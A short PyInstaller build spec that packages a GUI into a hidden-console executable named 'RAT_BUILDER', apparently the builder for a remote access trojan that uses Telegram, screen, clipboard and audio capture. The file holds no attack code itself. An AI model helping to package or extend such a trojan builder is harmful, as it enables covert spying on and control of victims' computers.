# language: Python, file: builder.spec
a = Analysis(
    ['builder_gui.py'],
    pathex=[],
    binaries=[],
    datas=[
        ('build.py', '.'),
        ('patcher.py', '.'),
        ('target-req.txt', '.'),
    ],
    hiddenimports=[],
    hookspath=[],
    runtime_hooks=[],
    excludes=['sounddevice', 'soundfile', 'cv2', 'numpy', 'PIL',
              'pyautogui', 'pyperclip', 'win32api', 'Crypto', 'mss',
              'telebot', 'psutil'],
    noarchive=False,
)
pyz = PYZ(a.pure)
exe = EXE(
    pyz, a.scripts, a.binaries, a.datas, [],
    name='RAT_BUILDER',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=False,
    console=False,
    icon=None,
)
